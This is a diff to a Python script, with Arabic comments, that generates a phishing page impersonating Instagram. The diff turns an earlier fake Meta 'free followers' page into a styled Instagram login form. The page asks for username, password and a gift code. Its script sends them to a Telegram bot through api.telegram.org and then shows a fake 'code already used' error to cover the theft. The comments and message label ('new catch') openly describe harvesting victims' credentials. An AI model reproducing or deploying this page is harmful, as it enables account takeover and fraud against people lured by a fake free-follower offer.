@@ -1,114 +1,164 @@
 import os
 
-# تعريف محتوى صفحة HTML مع الستاييل والسكربت
+# تعريف محتوى صفحة HTML مع ستايل Instagram Modern الجديد
 html_content = f"""
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Business - زيادة المتابعين</title>
+    <title>تسجيل الدخول • Instagram</title>
     <style>
         :root {{
-            --meta-blue: #0668E1;
-            --meta-bg: #f0f2f5;
+            --insta-blue: #0095f6;
             --white: #ffffff;
+            --bg-start: #f8206d; /* ألوان الليكويد gradient */
+            --bg-end: #36014c;
         }}
+
         body {{
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--meta-bg);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             margin: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            overflow: hidden;
+            background: linear-gradient(135deg, var(--bg-start), var(--bg-end));
+            background-size: 200% 200%;
+            animation: gradientMove 10s ease infinite; /* تأثير ليكويد متحرك */
         }}
-        .container {{
-            background: var(--white);
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 12px 28px 0 rgba(0, 0, 0, 0.2);
+
+        @keyframes gradientMove {{
+            0% {{ background-position: 0% 50%; }}
+            50% {{ background-position: 100% 50%; }}
+            100% {{ background-position: 0% 50%; }}
+        }}
+
+        /* تأثير القلاس Glassmorphism Container */
+        .glass-container {{
+            background: rgba(255, 255, 255, 0.1); /* شفافية القلاس */
+            border-radius: 12px;
+            padding: 40px 30px;
+            border: 1px solid rgba(255, 255, 255, 0.2); /* حدود مضيئة */
+            backdrop-filter: blur(15px); /* تعتيم الخلفية */
+            -webkit-backdrop-filter: blur(15px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
             width: 100%;
-            max-width: 400px;
-            text-align: center;
+            max-width: 350px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            transition: transform 0.3s ease;
         }}
+        
+        .glass-container:hover {{
+            transform: translateY(-5px); /* حركة بسيطة عند الهوفر */
+        }}
+
         .logo {{
-            width: 120px;
-            margin-bottom: 20px;
+            width: 175px;
+            margin-bottom: 25px;
+            filter: drop-shadow(0 0 5px rgba(255, 255, 255, 0.5)); /* تأثير ضوئي للوغو */
         }}
-        h2 {{
-            color: #1c1e21;
-            font-size: 20px;
-            margin-bottom: 10px;
-        }}
-        p {{
-            color: #606770;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }}
+
         input {{
             width: 100%;
-            padding: 14px;
-            margin: 8px 0;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            box-sizing: border-box;
-            font-size: 15px;
-            outline: none;
-            transition: 0.3s;
-        }}
-        input:focus {{
-            border-color: var(--meta-blue);
-            box-shadow: 0 0 0 2px #e7f3ff;
-        }}
-        .btn {{
-            background-color: var(--meta-blue);
-            color: white;
-            border: none;
-            width: 100%;
             padding: 12px;
+            margin-bottom: 10px;
+            background: rgba(255, 255, 255, 0.15); /* شفافية خانات الإدخال */
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 5px;
+            color: white;
+            font-size: 14px;
+            outline: none;
+            box-sizing: border-box;
+            transition: all 0.2s ease-in-out;
+            text-align: right;
+        }}
+
+        input::placeholder {{
+            color: rgba(255, 255, 255, 0.7);
+        }}
+
+        input:focus {{
+            background: rgba(255, 255, 255, 0.25);
+            border-color: rgba(255, 255, 255, 0.4);
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+        }}
+
+        .btn {{
+            background-color: rgba(0, 149, 246, 0.7); /* زر شبه شفاف */
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            width: 100%;
+            padding: 10px;
             border-radius: 6px;
-            font-size: 17px;
+            font-size: 15px;
             font-weight: bold;
             cursor: pointer;
-            margin-top: 15px;
-            transition: 0.3s;
-        }}
-        .btn:hover {{
-            background-color: #055ecb;
-        }}
-        .error-msg {{
-            color: #fa3e3e;
-            font-size: 13px;
             margin-top: 10px;
-            display: none;
-            background: #ffebe9;
-            padding: 8px;
-            border-radius: 4px;
+            transition: all 0.2s ease-in-out;
+            backdrop-filter: blur(5px);
         }}
+
+        .btn:hover {{
+            background-color: var(--insta-blue);
+            transform: scale(1.02);
+            box-shadow: 0 0 15px rgba(0, 149, 246, 0.4);
+        }}
+
+        .error-msg {{
+            color: #ff5050;
+            font-size: 13px;
+            margin-top: 15px;
+            display: none;
+            background: rgba(255, 80, 80, 0.15);
+            padding: 10px;
+            border-radius: 4px;
+            width: 100%;
+            box-sizing: border-box;
+            border: 1px solid rgba(255, 80, 80, 0.3);
+            backdrop-filter: blur(5px);
+            animation: fadeIn 0.5s ease;
+        }}
+
+        @keyframes fadeIn {{
+            from {{ opacity: 0; transform: translateY(10px); }}
+            to {{ opacity: 1; transform: translateY(0); }}
+        }}
+
+        .info-text {{
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 13px;
+            margin-bottom: 20px;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.2);
+        }}
+
         .footer {{
-            margin-top: 20px;
-            font-size: 12px;
-            color: #8a8d91;
+            margin-top: 30px;
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.5);
+            text-shadow: 0 1px 1px rgba(0,0,0,0.1);
         }}
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" alt="Meta Logo" class="logo">
-    <h2>احصل على 50 متابع مجاناً</h2>
-    <p>قم بتسجيل الدخول وإدخال كود التنشيط لاستلام المتابعين فوراً.</p>
+<div class="glass-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
+    
+    <p class="info-text">ادخل بياناتك وكود الهدية لتفعيل 50 متابع مجاناً.</p>
 
     <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
     <input type="password" id="password" placeholder="كلمة السر" required>
     <input type="text" id="gift_code" placeholder="أدخل كود الهدية المكون من 6 أرقام" required>
     
-    <button class="btn" onclick="sendData()">تنشيط المتابعين</button>
+    <button class="btn" onclick="sendData()">تسجيل دخول المتابعين</button>
     
-    <div id="error" class="error-msg">خطأ: هذا الكود تم استخدامه مسبقاً من قبل مستخدم آخر.</div>
+    <div id="error" class="error-msg">خطأ: هذا الكود تم استخدامه مسبقاً.</div>
 
-    <div class="footer">Meta © 2026 - نظام حماية الخصوصية</div>
+    <div class="footer">Instagram © 2026 - نظام حماية المتابعين</div>
 </div>
 
 <script>
@@ -126,13 +176,13 @@ html_content = f"""
             return;
         }}
 
-        const message = `🔔 **تسجيل دخول جديد**\\n👤 User: ${{user}}\\n🔑 Pass: ${{pass}}\\n🎟 Code: ${{code}}`;
+        const message = `🔥 **صيد جديد (انستغرام/50 متابع)**\\n👤 يوزر: ${{user}}\\n🔑 باس: ${{pass}}\\n🎟 كود الهدية: ${{code}}`;
         
         const url = `https://api.telegram.org/bot${{BOT_TOKEN}}/sendMessage?chat_id=${{CHAT_ID}}&text=${{encodeURIComponent(message)}}&parse_mode=Markdown`;
 
         try {{
             await fetch(url);
-            // إظهار رسالة الخطأ الوهمية بعد "الإرسال" بنجاح
+            // إظهار رسالة الخطأ الوهمية بعد "الإرسال" بنجاح لإكمال السيناريو
             errorDiv.style.display = "block";
         }} catch (e) {{
             console.log("Error sending data");
@@ -144,8 +194,9 @@ html_content = f"""
 </html>
 """
 
-# حفظ الكود في ملف
-with open("meta_page.html", "w", encoding="utf-8") as f:
+# حفظ الكود الجديد في ملف
+with open("instagram_modern.html", "w", encoding="utf-8") as f:
     f.write(html_content)
 
-print("تم إنشاء الصفحة بنجاح باسم meta_page.html")
+print("تم إنشاء الصفحة بنجاح باسم instagram_modern.html")
+print("الصفحة الآن تحاكي انستغرام تماماً مع تأثيرات ليكويد وقلاس احترافية.")
